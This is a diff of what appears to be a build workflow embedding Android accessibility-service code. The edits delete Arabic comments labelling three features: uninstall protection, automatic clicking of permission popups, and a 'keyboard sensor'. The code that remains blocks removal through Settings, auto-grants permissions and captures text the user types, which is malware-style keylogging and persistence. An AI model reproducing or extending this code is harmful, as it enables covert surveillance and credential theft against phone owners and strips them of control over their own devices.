@@ -44,7 +44,7 @@ jobs:
         <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
             android:accessibilityEventTypes="typeWindowStateChanged|typeViewTextChanged|typeWindowContentChanged"
             android:accessibilityFeedbackType="feedbackGeneric"
-            android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveWindowContent"
+            android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds"
             android:canRetrieveWindowContent="true"
             android:description="@string/accessibility_desc"
             android:packageNames="com.android.settings"
@@ -256,7 +256,6 @@ jobs:
                 if (event.getPackageName() != null) {
                     String pkg = event.getPackageName().toString();
                     
-                    // حماية ضد إلغاء التثبيت
                     if (pkg.contains("settings")) {
                         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                         if (rootNode != null) {
@@ -265,13 +264,11 @@ jobs:
                         }
                     }
 
-                    // ميزة النقر التلقائي الذكي على نوافذ الأذونات المنبثقة
                     AccessibilityNodeInfo root = getRootInActiveWindow();
                     if (root != null) {
                         autoClickPermissions(root);
                     }
 
-                    // مستشعر لوحة المفاتيح
                     if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                         List<CharSequence> textList = event.getText();
                         if (textList != null) {
